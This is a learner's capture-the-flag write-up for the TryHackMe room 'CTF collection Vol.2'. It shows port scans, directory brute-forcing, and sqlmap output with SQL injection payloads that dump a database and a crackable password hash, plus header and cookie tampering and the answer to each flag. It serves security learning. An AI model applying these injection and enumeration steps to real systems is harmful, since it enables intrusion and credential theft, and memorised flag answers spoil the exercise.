<p align="left">November 6, 2024 - Hey there, fellow lifelong learner!<br>
I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure. It´s part of my $$\textcolor{#FF69B4}{\textbf{184}}$$-day-streak in  <a href="https://tryhackme.com/r/p/Rosana">TryHackMe</a>.</p>

<h1 align="center">
  $$\textcolor{#3bd62d}{\textnormal{&nbsp; CTF collection Vol.2}}$$
</h1>

<p align="center">Sharpening up your CTF skill with the collection. The second volume is about web-based CTF.<br>
                  Access this 🆓 TryHackMe CTF Room clicking <a href="https://tryhackme.com/r/room/ctfcollectionvol2">CTF collection Vol.2</a>.</p><br>
<p align="center">
  <img height="150px" hspace="20" src="https://github.com/user-attachments/assets/6628e1a4-ea67-4e69-b719-702b2fc07e4c">
  <img height="150px" src="https://github.com/user-attachments/assets/ff30a89c-7b87-43e9-9ec0-02d34d0f8548">
</p>

<h2>Task 1. Author note</h2>

<p>Welcome, welcome and welcome to another CTF collection. This is the second installment of the CTF collection series. For your information, the second serious focuses on the web-based challenge. There are a total of 20 easter eggs a.k.a flags can be found within the box. Let see how good is your CTF skill.<br>

Now, deploy the machine and collect the eggs!</p>

<p>Warning: The challenge contains seizure images and background. If you feeling uncomfortable, try removing the background on <style> tag.</p>

Note: All the challenges flag are formatted as THM{flag}, unless stated otherwise</p>

> 1.1. <em>Fact: Eggs contain the highest quality protein you can buy.</em><br>
>> <strong>No answer needed</strong>
<p></p>

<br>

<h2>Task 2. Easter egg</h2>

<p>Submit all your easter egg right here. Gonna find it all!</p>

> 2.1. <em>Easter 1</em><br>
> <code>Question Hint</code>: Check the robots.
>> <strong>THM{4u70b07_r0ll_0u7}</strong>
<p></p>

<pre><code>$ rustscan -a 10.10.157.196 -- -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
\U0001f30dHACK THE PLANET\U0001f30d

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.157.196:22
Open 10.10.157.196:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.80 ( https://nmap.org ) at 2024-11-06 21:27 UTC
NSE: Loaded 45 scripts for scanning.
Initiating Ping Scan at 21:27
Scanning 10.10.157.196 [2 ports]
Completed Ping Scan at 21:27, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 21:27
Completed Parallel DNS resolution of 1 host. at 21:27, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 1, NX: 0, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 21:27
Scanning ip-10-10-157-196.eu-west-1.compute.internal (10.10.157.196) [2 ports]
Discovered open port 80/tcp on 10.10.157.196
Discovered open port 22/tcp on 10.10.157.196
Completed Connect Scan at 21:27, 0.00s elapsed (2 total ports)
Initiating Service scan at 21:27
Scanning 2 services on ip-10-10-157-196.eu-west-1.compute.internal (10.10.157.196)
Completed Service scan at 21:28, 6.09s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.157.196.
SE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 21:28
Completed NSE at 21:28, 0.03s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 21:28
Completed NSE at 21:28, 0.04s elapsed
Nmap scan report for ip-10-10-157-196.eu-west-1.compute.internal (10.10.157.196)
Host is up, received syn-ack (0.00050s latency).
Scanned at 2024-11-06 21:27:53 UTC for 7s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.2.22 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.01 seconds
</code></pre>

![image](https://github.com/user-attachments/assets/7cf7a060-19c7-4740-9d08-d7c85c32c93f)

<pre><code>root@ip-[Attack_IP]:~# gobuster dir -u http://10.10.157.196 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.157.196
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 301) [Size: 314] [--> http://10.10.157.196/login/]
/index                (Status: 200) [Size: 94328]
/button               (Status: 200) [Size: 39148]
/static               (Status: 200) [Size: 253890]
/cat                  (Status: 200) [Size: 62048]
/small                (Status: 200) [Size: 689]
/who                  (Status: 200) [Size: 3847428]
/robots               (Status: 200) [Size: 430]
/iphone               (Status: 200) [Size: 19867]
/game1                (Status: 301) [Size: 314] [--> http://10.10.157.196/game1/]
/egg                  (Status: 200) [Size: 25557]
/dinner               (Status: 200) [Size: 1264533]
/ty                   (Status: 200) [Size: 198518]
/ready                (Status: 301) [Size: 314] [--> http://10.10.157.196/ready/]
/saw                  (Status: 200) [Size: 156274]
/game2                (Status: 301) [Size: 314] [--> http://10.10.157.196/game2/]
/wel                  (Status: 200) [Size: 155758]
/free_sub             (Status: 301) [Size: 317] [--> http://10.10.157.196/free_sub/]
/nicole               (Status: 200) [Size: 367650]
/server-status        (Status: 403) [Size: 294]
Progress: 135446 / 220561 (61.41%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 136330 / 220561 (61.81%)
===============================================================
Finished
===============================================================
root@ip-[Attack_IP]:~# 
</code></pre>

![image](https://github.com/user-attachments/assets/80d5876a-803a-4afe-be31-e0c21c0004ad)

![image](https://github.com/user-attachments/assets/710449d5-e0fa-4547-873a-d689be15fc48)

<pre><code>root@ip-[Attack_IP]:~# echo "45 61 73 74 65 72 20 31 3a 20 54 48 4d 7b 34 75 37 30 62 30 37 5f 72 30 6c 6c 5f 30 75 37 7d" | xxd -r -p
Easter 1: THM{4u70b07_r0ll_0u7}
root@ip-[Attack_IP]:~# 
</code></pre>

<br>

> 2.2. <em>Easter 2</em><br>
> <code>Question Hint</code>: Decode the base64 multiple times. Don't forget there are something being encoded.
>> <strong>THM{f4ll3n_b453}</strong>
<p></p>

![image](https://github.com/user-attachments/assets/6d2d90e5-e448-4968-9201-27d4026d44b7)

<pre><code>root@ip-[Attack_IP]:~# sudo apt-get install gridsite-clients
</code></pre>

<pre><code>root@ip-[Attack_IP]:~# urlencode -d $(echo "VlNCcElFSWdTQ0JKSUVZZ1dTQm5JR1VnYVNCQ0lGUWdTU0JFSUVrZ1p5QldJR2tnUWlCNklFa2dSaUJuSUdjZ1RTQjVJRUlnVHlCSklFY2dkeUJuSUZjZ1V5QkJJSG9nU1NCRklHOGdaeUJpSUVNZ1FpQnJJRWtnUlNCWklHY2dUeUJUSUVJZ2NDQkpJRVlnYXlCbklGY2dReUJDSUU4Z1NTQkhJSGNnUFElM0QlM0Q=" | base64 -d) | base64 -d | sed "s/\ //g" | base64 -d | sed "s/\ //g" | base64 -d
DesKel_secret_base
</code></pre>

![image](https://github.com/user-attachments/assets/34444a26-e7bc-418f-9ec4-2bf011f9ab03)

![image](https://github.com/user-attachments/assets/febcb3a7-3bbc-4e89-ad25-ad043f9daa53)     

<br>

> 2.3. <em>Easter 3</em><br>
> <code>Question Hint</code>: Directory buster with common.txt might help.
>> <strong>THM{y0u_c4n'7_533_m3}</strong>
<p></p>

![image](https://github.com/user-attachments/assets/0059e8dc-d592-4055-b802-8b35c146d8dc)

![image](https://github.com/user-attachments/assets/4c0cf585-4d13-4ecd-bee6-197160b3b139)

<br>

> 2.4. <em>Easter 4</em><br>
> <code>Question Hint</code>: time-based sqli
>> <strong>THM{1nj3c7_l1k3_4_b055}</strong>
<p></p>

![image](https://github.com/user-attachments/assets/56d0d814-c921-4443-8361-a38febbae083)

![image](https://github.com/user-attachments/assets/5b40e8da-e1a9-4c97-965c-e1b5905d80ed)

![image](https://github.com/user-attachments/assets/190353b2-b02f-4305-8e98-95c06212613e)

<pre><code>root@ip-[Attack_IP]:~# sqlmap -r request.txt --dbs --level 3 --risk 3
...
...
22:12:17] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
[22:12:17] [INFO] testing 'MySQL <= 5.0.11 time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[22:12:17] [INFO] testing 'Generic UNION query (93) - 1 to 10 columns'
[22:12:18] [INFO] testing 'MySQL UNION query (93) - 1 to 10 columns'
[22:12:20] [WARNING] User-Agent parameter 'User-Agent' does not seem to be injectable
sqlmap identified the following injection point(s) with a total of 21062 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: username=-4382' OR 3822=3822-- KYTP&password=admin&submit=submit

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: username=admin' OR SLEEP(5)-- EDrn&password=admin&submit=submit
---
[22:12:20] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 13.04 or 12.04 or 12.10 (Raring Ringtail or Precise Pangolin or Quantal Quetzal)
web application technology: Apache 2.2.22, PHP 5.3.10
back-end DBMS: MySQL >= 5.0.12
[22:12:20] [INFO] fetching database names
[22:12:20] [INFO] fetching number of databases
[22:12:20] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[22:12:20] [INFO] retrieved: 4
[22:12:20] [INFO] retrieved: information_schema
[22:12:21] [INFO] retrieved: THM_f0und_m3
[22:12:21] [INFO] retrieved: mysql
[22:12:21] [INFO] retrieved: performance_schema
available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] THM_f0und_m3

[22:12:22] [INFO] fetched data logged to text files under '/root/.sqlmap/output/[Target_IP]'

[*] shutting down at 22:12:22
</code></pre>

<pre><code>root@root@ip-[Attack_IP]:~# sqlmap -r request --dbs --level 3 --risk 3 -D THM_f0und_m3 --tables
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.2.4#stable}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 22:14:05

[22:14:05] [INFO] parsing HTTP request from 'request'
[22:14:05] [INFO] resuming back-end DBMS 'mysql' 
[22:14:05] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: username=-4382' OR 3822=3822-- KYTP&password=admin&submit=submit

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: username=admin' OR SLEEP(5)-- EDrn&password=admin&submit=submit
---
[22:14:05] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 13.04 or 12.04 or 12.10 (Raring Ringtail or Precise Pangolin or Quantal Quetzal)
web application technology: Apache 2.2.22, PHP 5.3.10
back-end DBMS: MySQL >= 5.0.12
[22:14:05] [INFO] fetching database names
[22:14:05] [INFO] fetching number of databases
[22:14:05] [INFO] resumed: 4
[22:14:05] [INFO] resumed: information_schema
[22:14:05] [INFO] resumed: THM_f0und_m3
[22:14:05] [INFO] resumed: mysql
[22:14:05] [INFO] resumed: performance_schema
available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] THM_f0und_m3

[22:14:05] [INFO] fetching tables for database: 'THM_f0und_m3'
[22:14:05] [INFO] fetching number of tables for database 'THM_f0und_m3'
[22:14:05] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[22:14:05] [INFO] retrieved: 2
[22:14:05] [INFO] retrieved: nothing_inside
[22:14:06] [INFO] retrieved: user
Database: THM_f0und_m3
[2 tables]
+----------------+
| user           |
| nothing_inside |
+----------------+

[22:14:06] [INFO] fetched data logged to text files under '/root/.sqlmap/output/[Target_ID]'

[*] shutting down at 22:14:06

root@ip-[Attack_IP]:~# 
</code></pre>

<br>

<pre><code>root@root@ip-[Attack_IP]:~# sqlmap -r request --dbs --level 3 --risk 3 -T nothing_inside --columns
       ___
       __H__
 ___ ___[(]_____ ___ ___  {1.2.4#stable}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 22:17:23

[22:17:23] [INFO] parsing HTTP request from 'request'
[22:17:23] [INFO] resuming back-end DBMS 'mysql' 
[22:17:23] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: username=-4382' OR 3822=3822-- KYTP&password=admin&submit=submit

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: username=admin' OR SLEEP(5)-- EDrn&password=admin&submit=submit
---
[22:17:23] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 13.04 or 12.04 or 12.10 (Raring Ringtail or Precise Pangolin or Quantal Quetzal)
web application technology: Apache 2.2.22, PHP 5.3.10
back-end DBMS: MySQL >= 5.0.12
[22:17:23] [INFO] fetching database names
[22:17:23] [INFO] fetching number of databases
[22:17:23] [INFO] resumed: 4
[22:17:23] [INFO] resumed: information_schema
[22:17:23] [INFO] resumed: THM_f0und_m3
[22:17:23] [INFO] resumed: mysql
[22:17:23] [INFO] resumed: performance_schema
available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] THM_f0und_m3

[22:17:23] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) columns
[22:17:23] [INFO] fetching current database
[22:17:23] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[22:17:23] [INFO] retrieved: THM_f0und_m3
[22:17:23] [INFO] fetching columns for table 'nothing_inside' in database 'THM_f0und_m3'
[22:17:23] [INFO] retrieved: 1
[22:17:23] [INFO] retrieved: Easter_4
[22:17:24] [INFO] retrieved: varchar(30)
Database: THM_f0und_m3
Table: nothing_inside
[1 column]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| Easter_4 | varchar(30) |
+----------+-------------+

[22:17:24] [INFO] fetched data logged to text files under '/root/.sqlmap/output/[Target_IP]'

[*] shutting down at 22:17:24

root@ip-10-10-146-248:~# 
</code></pre>


<pre><code>root@root@ip-[Attack_IP]:~# sqlmap -r request --dbs --level 3 --risk 3 -T nothing_inside --dump-all
       ___
       __H__
 ___ ___[,]_____ ___ ___  {1.2.4#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 22:19:29

[22:19:29] [INFO] parsing HTTP request from 'request'
[22:19:29] [INFO] resuming back-end DBMS 'mysql' 
[22:19:29] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: username=-4382' OR 3822=3822-- KYTP&password=admin&submit=submit

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: username=admin' OR SLEEP(5)-- EDrn&password=admin&submit=submit
---
[22:19:29] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 13.04 or 12.04 or 12.10 (Raring Ringtail or Precise Pangolin or Quantal Quetzal)
web application technology: Apache 2.2.22, PHP 5.3.10
back-end DBMS: MySQL >= 5.0.12
[22:19:29] [INFO] fetching database names
[22:19:29] [INFO] fetching number of databases
[22:19:29] [INFO] resumed: 4
[22:19:29] [INFO] resumed: information_schema
...
...
[22:20:00] [INFO] fetching entries for table 'nothing_inside' in database 'THM_f0und_m3'
[22:20:00] [INFO] fetching number of entries for table 'nothing_inside' in database 'THM_f0und_m3'
[22:20:00] [INFO] retrieved: 1
[22:20:00] [INFO] retrieved: THM{1nj3c7_l1k3_4_b055}
Database: THM_f0und_m3
Table: nothing_inside
[1 entry]
+-------------------------+
| Easter_4                |
+-------------------------+
| THM{1nj3c7_l1k3_4_b055} |
+-------------------------+

[22:20:01] [INFO] table 'THM_f0und_m3.nothing_inside' dumped to CSV file '/root/.sqlmap/output/10.10.157.196/dump/THM_f0und_m3/nothing_inside.csv'
[22:20:01] [INFO] fetching columns for table 'user' in database 'THM_f0und_m3'
[22:20:01] [INFO] retrieved: 2
[22:20:01] [INFO] retrieved: username
[22:20:01] [INFO] retrieved: password
[22:20:01] [INFO] fetching entries for table 'user' in database 'THM_f0und_m3'
[22:20:01] [INFO] fetching number of entries for table 'user' in database 'THM_f0und_m3'
[22:20:01] [INFO] retrieved: 2
[22:20:01] [INFO] retrieved: 05f3672ba34409136aa71b8d00070d1b
[22:20:03] [INFO] retrieved: DesKel
[22:20:03] [INFO] retrieved: He is a nice guy, say hello for me
...  
</code></pre>

<br>

> 2.5. <em>Easter 5</em><br>
> <code>Question Hint</code>: Another sqli
>> <strong>THM{wh47_d1d_17_c057_70_cr4ck_7h3_5ql}</strong>
<p></p>

<pre><code>root@root@ip-[Attack_IP]:~# sqlmap -r request --dbs --level 3 --risk 3 -T nothing_inside --dump-all
...
[22:20:00] [INFO] fetching entries for table 'nothing_inside' in database 'THM_f0und_m3'
[22:20:00] [INFO] fetching number of entries for table 'nothing_inside' in database 'THM_f0und_m3'
[22:20:00] [INFO] retrieved: 1
[22:20:00] [INFO] retrieved: THM{1nj3c7_l1k3_4_b055}
Database: THM_f0und_m3
Table: nothing_inside
[1 entry]
+-------------------------+
| Easter_4                |
+-------------------------+
| THM{1nj3c7_l1k3_4_b055} |
+-------------------------+
...
[22:45:04] [INFO] table 'THM_f0und_m3.nothing_inside' dumped to CSV file '/root/.sqlmap/output/10.10.157.196/dump/THM_f0und_m3/nothing_inside.csv'
[22:45:04] [INFO] fetching columns for table 'user' in database 'THM_f0und_m3'
[22:45:04] [INFO] resumed: 2
[22:45:04] [INFO] resumed: username
[22:45:04] [INFO] resumed: password
[22:45:04] [INFO] fetching entries for table 'user' in database 'THM_f0und_m3'
[22:45:04] [INFO] fetching number of entries for table 'user' in database 'THM_f0und_m3'
[22:45:04] [INFO] resumed: 2
[22:45:04] [INFO] resumed: 05f3672ba34409136aa71b8d00070d1b
[22:45:04] [INFO] resumed: DesKel
[22:45:04] [INFO] resumed: He is a nice guy, say hello for me
[22:45:04] [INFO] resumed: Skidy
[22:45:04] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[22:45:09] [INFO] writing hashes to a temporary file '/tmp/sqlmapt34iIC14886/sqlmaphashes-XYsiDb.txt' 
do you want to crack them via a dictionary-based attack? [Y/n/q]                                                          
Database: THM_f0und_m3                                                                                                                   
Table: user
[2 entries] 
</code></pre>

![image](https://github.com/user-attachments/assets/dc41a558-f11a-4fef-98ca-e27711b03a3b)

<p>User: DesKel<br>
Password: cutie</p>

![image](https://github.com/user-attachments/assets/26d6e431-b377-4c90-b693-214c54fd0954)

![image](https://github.com/user-attachments/assets/6974dd72-3c96-470f-a51d-8ea3cc9cc7a6)

<br>

> 2.6. <em>Easter 6</em><br>
> <code>Question Hint</code>: Look out for the response header.
>> <strong>THM{l37'5_p4r7y_h4rd}</strong>
<p></p>

![image](https://github.com/user-attachments/assets/f6813926-8e54-4a6a-afd2-efcde1232507)

![image](https://github.com/user-attachments/assets/d97e119a-f9ed-4350-b6ad-6c346e267f6b)

<br>

> 2.7. <em>Easter 7</em><br>
> <code>Question Hint</code>: Cookie is delicious
>> <strong>THM{w3lc0m3!_4nd_w3lc0m3}</strong>
<p></p>

![image](https://github.com/user-attachments/assets/72ca764f-08cf-43ee-aecf-b8dd7f3bf03e)

<p>I sent it to Repeater changing <code>Cookie</code> parameter to <code>Invited=1</code> and it worked!</p>

![image](https://github.com/user-attachments/assets/826071a8-7644-4c28-80e5-c2d37f71f72a)

<br>

> 2.8. <em>Easter 8</em><br>
> <code>Question Hint</code>: Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1
>> <strong>THM{h3y_r1ch3r_wh3r3_15_my_k1dn3y}</strong>
<p></p>

<p>Using Burp, I intercepted a GET request to the main page, observing the <code>User-Agent</code>. </p>

![image](https://github.com/user-attachments/assets/40b9152c-f909-4b50-833f-ef0981da3793)

<br>

![image](https://github.com/user-attachments/assets/92fae6fc-b6d9-4073-ae4b-87fe0bc19019)

<br>

![image](https://github.com/user-attachments/assets/c27a5235-b83c-411e-8a4b-60e09ff75256)

<br>

> 2.9 - <em>Easter 9</em><br>
> <code>Question Hint</code>: Something is redirected too fast. You need to capture it.
>> <strong>______</strong>
<p></p>

<p>Review the Gobuster we run before ...</p>

<pre><code>root@ip-[Attack_IP]:~# gobuster dir -u http://[Target_IP] -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://[Target_IP]
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 301) [Size: 314] [--> http://[Target_IP]/login/]
/index                (Status: 200) [Size: 94328]
/button               (Status: 200) [Size: 39148]
/static               (Status: 200) [Size: 253890]
/cat                  (Status: 200) [Size: 62048]
/small                (Status: 200) [Size: 689]
/who                  (Status: 200) [Size: 3847428]
/robots               (Status: 200) [Size: 430]
/iphone               (Status: 200) [Size: 19867]
/game1                (Status: 301) [Size: 314] [--> http://[Target_IP]/game1/]
/egg                  (Status: 200) [Size: 25557]
/dinner               (Status: 200) [Size: 1264533]
/ty                   (Status: 200) [Size: 198518]
/ready                (Status: 301) [Size: 314] [--> http://[Target_IP]/ready/]
/saw                  (Status: 200) [Size: 156274]
/game2                (Status: 301) [Size: 314] [--> http://[Target_IP]/game2/]
/wel                  (Status: 200) [Size: 155758]
/free_sub             (Status: 301) [Size: 317] [--> http://[Target_IP]/free_sub/]
/nicole               (Status: 200) [Size: 367650]
/server-status        (Status: 403) [Size: 294]
Progress: 135446 / 220561 (61.41%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 136330 / 220561 (61.81%)
===============================================================
Finished
===============================================================
root@ip-[Attack_IP]:~# 
</code></pre>

<p>When I tried <code>/ready</code> the web page is redirected.</p>

![image](https://github.com/user-attachments/assets/03090afd-533d-4228-b289-cb6a3345da34)

<p>After using the <code>Forward</code> feature, I found the flag.</p>

![image](https://github.com/user-attachments/assets/92f58b4e-3a1f-41c4-aa08-57d093d99327)

<br>

> 2.10. <em>Easter 10</em><br>
> <code>Question Hint</code>: Look at THM URL without https:// and use it as a referrer.
>> <strong>THM{50rry_dud3}</strong>
<p></p>

<p>I reviewed my Gobuster enumeration again ...</p>

<pre><code>root@ip-[Attack_IP]:~# gobuster dir -u http://[Target_IP] -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://[Target_IP]
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 301) [Size: 314] [--> http://[Target_IP]/login/]
/index                (Status: 200) [Size: 94328]
/button               (Status: 200) [Size: 39148]
/static               (Status: 200) [Size: 253890]
/cat                  (Status: 200) [Size: 62048]
/small                (Status: 200) [Size: 689]
/who                  (Status: 200) [Size: 3847428]
/robots               (Status: 200) [Size: 430]
/iphone               (Status: 200) [Size: 19867]
/game1                (Status: 301) [Size: 314] [--> http://[Target_IP]/game1/]
/egg                  (Status: 200) [Size: 25557]
/dinner               (Status: 200) [Size: 1264533]
/ty                   (Status: 200) [Size: 198518]
/ready                (Status: 301) [Size: 314] [--> http://[Target_IP]/ready/]
/saw                  (Status: 200) [Size: 156274]
/game2                (Status: 301) [Size: 314] [--> http://[Target_IP]/game2/]
/wel                  (Status: 200) [Size: 155758]
/free_sub             (Status: 301) [Size: 317] [--> http://[Target_IP]/free_sub/]
/nicole               (Status: 200) [Size: 367650]
/server-status        (Status: 403) [Size: 294]
Progress: 135446 / 220561 (61.41%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 136330 / 220561 (61.81%)
===============================================================
Finished
===============================================================
root@ip-[Attack_IP]:~# 
</code></pre>

<p>And decided to evaluate <code>free_sub</code>, and got this in BurpSuite ...</p>

![image](https://github.com/user-attachments/assets/3880660d-8b10-4087-9ecc-ec149a41fba7)

<p>The hint is <em>Look at THM URL without https:// and use it as a referrer</em>.<br>
So I sent it to the <code>Repeater</code>code> and added <code>Referer: tryhackme.com</code>.<br>
After clicking <code>Send</code>code>, I obtained the <code>Easter 10</code> flag. </p>

![image](https://github.com/user-attachments/assets/5a92c4de-29c0-4d41-86a8-0ecf3fde6108)

<br>

> 2.11. <em>Easter 11</em><br>
> <code>Question Hint</code>: Temper the html.
>> <strong>THM{366y_b4k3y}</strong>
<p></p>

> 2.12. <em>Easter 12</em><br>
> <code>Question Hint</code>: Fake js file.
>> <strong>THM{h1dd3n_j5_f1l3}</strong>
<p></p>

> 2.13. <em>Easter 13</em><br>
> <code>No hint provided.</code>
>> <strong>THM{1_c4n'7_b3l13v3_17}</strong>
<p></p>

> 2.14. <em>Easter 14</em><br>
> <code>Question Hint</code>: Embed image code.
>> <strong>THM{d1r3c7_3mb3d}</strong>
<p></p>

> 2.15. <em>Easter 15</em><br>
> <code>Question Hint</code>: Try guest the alphabet and the hash code.
>> <strong>THM{ju57_4_64m3}</strong>
<p></p>

> 2.16. <em>Easter 16</em><br>
> <code>Question Hint</code>: Make all inputs into one form..
>> <strong>THM{73mp3r_7h3_h7ml}</strong>
<p></p>

> 2.17. <em>Easter 17</em><br>
> <code>Question Hint</code>: bin -> dec -> hex -> ascii
>> <strong>THM{j5_j5_k3p_d3c0d3}</strong>
<p></p>

> 2.18. <em>Easter 18</em><br>
> <code>Question Hint</code>: Request header. Format is egg:Yes
>> <strong>THM{70ny_r0ll_7h3_366}</strong>
<p></p>

> 2.19. <em>Easter 19</em><br>
> <code>Question Hint</code>: A thick dark line
>> <strong>THM{700_5m4ll_3yy}</strong>
<p></p>


> 2.20. <em>Easter 20</em><br>
> <code>Question Hint</code>: You need to POST the data instead of GET. Burp suite or curl might help.
>> <strong>THM{17_w45_m3_4ll_4l0n6}</strong>
<p></p>



<h2>Room Complete<a id='24'></a></h2>
<p>Keep learning, keep growing!<br>

![image](https://github.com/user-attachments/assets/69bd2cef-a481-4fbd-ad9b-ad970eec6294)

<h2>My Journey<a id='23'></a></h2>
<p></p>Following I share the status of my journey in TryHackMe.</p>

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     |
| :---------------: | :------- | :----------- | :----------- | :---------- | :--------- | :------  | :-------- |
|                   |          | WorldWide    | Brazil       | WorldWide   | Brazil     |          | Completed |
| November 6, 2024  | 184      |       1,297ª |          28ª |      4,428ª |        65ª | 53,700   |       402 |

![image](https://github.com/user-attachments/assets/a84660ad-9f3b-430e-a919-b72bd1a8a692)


<p style="text-align: center;">Thank you for coming. Hope to learn together again!!</p>